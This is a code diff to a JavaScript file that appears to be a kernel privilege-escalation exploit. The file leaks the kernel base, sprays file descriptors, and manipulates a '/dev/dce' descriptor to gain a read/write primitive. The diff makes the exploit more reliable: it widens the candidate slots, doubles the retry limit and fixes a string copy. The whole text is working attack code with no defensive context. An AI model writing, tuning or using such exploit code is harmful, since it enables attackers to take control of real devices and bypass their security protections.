@@ -20,7 +20,10 @@ const TPL_HI = 0x54545454;
 const DEV_DCE = "/dev/dce";
 const DEV_NULL = "/dev/null";
 const OPS_OFF = 0x985a;
-const CANDS = [8, 16, 48, 80, 112, 144, 176, 208, 232, 240];
+
+// Dense array covering all slots from 8 to 248
+const CANDS = [];
+for (let i = 8; i <= 248; i += 8) CANDS.push(i);
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
 
@@ -216,13 +219,13 @@ function phase2Leak(rootKq, fds) {
   let tries = 0;
 
   for (let attempt = 1; attempt <= 6; attempt++) {
-    if (target >= 0 || tries >= 32) break;
+    if (target >= 0 || tries >= 64) break; // Increased limit
     log("KV-ATTEMPT", attempt + "/6");
     for (const fd of fds) { if (fd !== -1) disarm(fd); }
     for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
     log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);
 
-    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 32; ci++) {
+    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 64; ci++) { // Increased limit
       const vi = CANDS[ci];
       if (vi >= fds.length) continue;
       const fd = fds[vi];
@@ -306,10 +309,9 @@ export async function runKevent(c) {
   ensureStubs();
 
   // --- FD BURNER ---
-  // Push the fd counter up so /dev/dce lands in the 250+ range
   const dev_null = allocBuf(16);
   zeroBuf(dev_null);
-  for (let i = 0; i < 5; i++) dev_null.dv.setUint8(i, DEV_NULL.charCodeAt(i));
+  for (let i = 0; i < DEV_NULL.length; i++) dev_null.dv.setUint8(i, DEV_NULL.charCodeAt(i));
   
   const burn = [];
   for (let i = 0; i < 250; i++) {
